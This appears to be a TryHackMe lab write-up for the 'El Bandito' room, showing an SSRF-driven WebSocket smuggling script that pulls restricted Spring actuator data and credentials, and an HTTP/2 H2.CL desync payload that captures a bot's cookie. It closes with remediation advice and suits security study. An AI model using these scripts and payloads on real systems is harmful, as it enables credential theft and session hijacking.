# El Bandito — TryHackMe Writeup

> **Room:** [El Bandito](https://tryhackme.com/room/elbandito) · **Difficulty:** Hard
> **Category:** Web / Red Teaming (request smuggling)
> **Author of writeup:** 0xnyx
> **Goal:** Capture two web flags by bypassing proxies with advanced request-smuggling techniques.

> ⚠️ In line with TryHackMe's write-up policy, **no flags, passwords, or cracked values are included** — only the method.

---

## How to read this writeup

Each step is **Do** → **You get** → **Why / what next**. This room is two independent-but-related smuggling chains:

`Flag 1 = SSRF + WebSocket smuggling (HTTP 101 trick) to reach a Spring actuator behind a proxy`
`Flag 2 = HTTP/2 request smuggling (H2.CL desync) to capture a bot's request cookie`

---

## Step 1 — Recon

**Do**

```bash
nmap -sVC -T4 -Pn <TARGET>
echo "<TARGET> elbandito.thm" | sudo tee -a /etc/hosts
```

**You get**

```
22/tcp    ssh
80/tcp    ssl/http   "El Bandito Server"   <- HTTPS served on port 80 (not 443!)
631/tcp   CUPS
8080/tcp  http       nginx, Spring Java Framework (favicon)
```

**Why / what next** — Two quirks matter: port 80 speaks **HTTPS** (use `https://elbandito.thm:80/`), and port 8080 is an **nginx → Spring Boot** app. The homepage on 80 responds over HTTP/2 and references `/static/messages.js`, which reveals a chat app (`/getMessages`, `/send_message`, `/access`). Enumerate 8080 too.

---

## Step 2 — Map the 8080 app and find the SSRF

**Do** — The 8080 SPA ("Bandit-Coin") loads `/services.html`; read it.

```bash
curl -s http://elbandito.thm:8080/services.html
gobuster dir -u http://elbandito.thm:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**You get**

- `services.html` contains an **SSRF** endpoint: `GET /isOnline?url=<URL>` (the server fetches your URL and reports ONLINE/OFFLINE).
- Gobuster reveals **Spring Boot actuator** endpoints: `/info`, `/health`, `/token` (200) and `/env`, `/trace`, `/metrics`, `/beans`, `/admin*` (403 — localhost only).

**Why / what next** — The juicy actuators (`/trace`, `/env`) are blocked by the nginx proxy to non-localhost clients. We need to reach them *as if from inside*. That's where the SSRF + a WebSocket-smuggling trick comes in.

---

## Step 3 — Flag 1: WebSocket smuggling (HTTP 101) → actuator

**Why** — The proxy only forwards to the restricted actuators if it believes a **WebSocket upgrade succeeded** (HTTP `101 Switching Protocols`). We make the SSRF (`/isOnline`) fetch an attacker server that returns **101**; the proxy then flips the connection into tunnel mode and forwards a **smuggled** request to the backend without ACL checks.

**Do** — Host a tiny 101 server, then smuggle a request to `/trace` over one raw socket:

```python
# server101.py  (run:  python3 server101.py 5555)
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler
class R(BaseHTTPRequestHandler):
    def do_GET(self):
        self.protocol_version = "HTTP/1.1"; self.send_response(101); self.end_headers()
HTTPServer(("", int(sys.argv[1])), R).serve_forever()
```

```python
# smuggle.py  (run:  python3 smuggle.py /trace)
import socket, sys
kali = "<ATTACKER>"; path = sys.argv[1] if len(sys.argv)>1 else "/trace"
req = (f"GET /isOnline?url=http://{kali}:5555 HTTP/1.1\r\nHost: elbandito.thm:8080\r\n"
       "Sec-WebSocket-Version: 13\r\nConnection: keep-alive, Upgrade\r\nUpgrade: websocket\r\n"
       "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n\r\n"
       f"GET {path} HTTP/1.1\r\nHost: elbandito.thm:8080\r\n\r\n")
s = socket.create_connection(("elbandito.thm",8080),10); s.sendall(req.encode())
s.settimeout(5); data=b""
try:
    while True:
        c=s.recv(4096)
        if not c: break
        data+=c
except: pass
print(data.decode(errors="replace"))
```

**You get** — `HTTP/1.1 101` from nginx, then a tunnelled `200` with the `/trace` JSON, which logs internal requests to **`/admin-flag`** and **`/admin-creds`**. Smuggle those paths to read them:

```bash
python3 smuggle.py /admin-flag     # <FLAG 1>
python3 smuggle.py /admin-creds    # username:password for the chat app
```

> It's timing-sensitive — restart `server101.py` and retry a few times if a run comes back empty.

---

## Step 4 — Flag 2: log in and set up for the chat flag

**Do** — Use the harvested creds on the port-80 chat app. The login form posts to `/login` (not `/access`, which only serves the form).

```bash
curl -ski -c elb.txt -X POST https://elbandito.thm:80/login \
  --data-urlencode "username=<USER>" --data-urlencode "password=<PASS>"
curl -sk -b elb.txt https://elbandito.thm:80/getMessages      # JSON chat — authenticated
```

**You get** — A valid session. The dashboard story says an **admin bot** periodically submits a request; its cookie holds the second flag.

**Why / what next** — The app sits behind **Varnish** and accepts **HTTP/2**. We abuse an HTTP/2 → HTTP/1.1 downgrade desync to capture the bot's request.

---

## Step 5 — Flag 2: HTTP/2 request smuggling (H2.CL desync)

**Why** — In HTTP/2 the `Content-Length` header shouldn't be used. If we send an H2 request that declares a small `Content-Length` but carries a larger body containing a smuggled `POST /send_message` with a big `Content-Length`, the backend (HTTP/1.1) waits for the remaining body bytes — which the **next client's request (the bot's)** fills. The bot's raw request, cookie and all, gets posted to the message board.

**Do (in Burp Repeater, HTTP/2, "Update Content-Length" OFF):**

```
POST / HTTP/2
Host: elbandito.thm:80
Cookie: session=<YOUR_SESSION>
Content-Length: 4

testPOST /send_message HTTP/1.1
Host: elbandito.thm:80
Cookie: session=<YOUR_SESSION>
Content-Type: application/x-www-form-urlencoded
Content-Length: 820
Te: trailers

data=Hi
```

- Send **once**, then **do nothing for ~60–90 s** (any request of your own would fill the poisoned connection instead of the bot's). A `503` from Varnish on send is normal — the desync is engaging.
- Read the board; the bot's smuggled request appears as a message:

```bash
curl -sk -b elb.txt https://elbandito.thm:80/getMessages | grep -o 'flag=THM{[^}]*}'
```

**You get** — The bot's `POST /login` request, whose `cookie: flag=...` holds **flag 2**.

> **Tuning:** the inner `Content-Length` must be just large enough to capture past the bot's `cookie:` header but not exceed the whole request (too large → timeout, no capture). Start near the request size and adjust ±40 across retries.

---

## The full chain at a glance

| Flag | Technique | Result |
|------|-----------|--------|
| — | nmap + read `services.html` | SSRF `/isOnline`, Spring actuators |
| 1 | WebSocket smuggling + SSRF (HTTP 101) | Read `/admin-flag`, `/admin-creds` |
| 2 | HTTP/2 H2.CL desync | Capture bot's request cookie |

## Lessons

- HTTPS can run on **port 80** — don't assume ports map to schemes. Read the SPA's JS/HTML for hidden endpoints.
- **Spring Boot actuators** (`/trace`, `/env`) leak internal paths and creds; proxies that gate them on a successful **WebSocket upgrade** can be fooled with a **101 response** via SSRF.
- **HTTP/2 → HTTP/1.1 downgrade desync (H2.CL)** behind Varnish lets you capture another user's request; tune the Content-Length and stay quiet while the victim connects.

## Remediation

- Don't expose Spring actuators; bind them to loopback and require auth.
- Validate WebSocket upgrades fully; don't tunnel on an attacker-controlled 101.
- Reject `Content-Length` on HTTP/2 messages at the edge; keep front-end and back-end HTTP parsing consistent.

---

*Write-up for [TryHackMe — El Bandito](https://tryhackme.com/room/elbandito).*
